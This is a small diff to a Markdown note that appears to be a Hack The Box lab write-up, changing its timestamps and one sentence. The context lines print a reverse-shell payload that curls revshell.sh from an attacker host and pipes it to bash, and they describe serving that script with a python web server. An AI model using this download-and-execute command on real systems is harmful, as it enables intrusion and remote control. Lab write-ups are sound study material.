@@ -1,5 +1,5 @@
 ---
-{"publish":true,"created":"2025-08-16T10:15:21.901+05:30","modified":"2025-12-25T11:54:54.290+05:30","published":"2025-12-25T11:54:54.290+05:30","tags":["easy","enum","CVE"],"cssclasses":"","api":"https://www.hackthebox.com/api/v4/user/achievement/machine/1454964/684"}
+{"publish":true,"created":"2025-08-16T10:15:21.901+05:30","modified":"2025-12-25T11:59:24.044+05:30","published":"2025-12-25T11:59:24.044+05:30","tags":["easy","enum","CVE"],"cssclasses":"","api":"https://www.hackthebox.com/api/v4/user/achievement/machine/1454964/684"}
 ---
 
 ## Initial Access
@@ -176,7 +176,7 @@ def exploit(target_url):
 
 This was the payload we used before URL-encoding to get a reverse shell: `["/bin/sh","-c","curl http://10.10.16.8/revshell.sh | bash"]`
 
-`revshell.sh` being the reverse shell payload. Obviously for the target to fetch our payload, we will have to start a python web server that hosts it.
+`revshell.sh` being the reverse shell payload as mentioned before. Obviously for the target to fetch our payload, we will have to start a python web server that hosts it.
 
 `python3 -m http.server`
 
